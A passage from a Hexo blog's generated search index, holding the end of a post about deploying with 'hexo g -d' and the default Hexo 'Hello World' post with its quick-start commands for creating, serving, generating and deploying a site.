class="hljs-attribute">hexo g -d</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230831201512390.png" alt="image-20230831201512390"></p><p><img src="/img/image-20230831201529838.png" alt="image-20230831201529838"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/22/hello-world/"/>
    <url>/2023/08/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
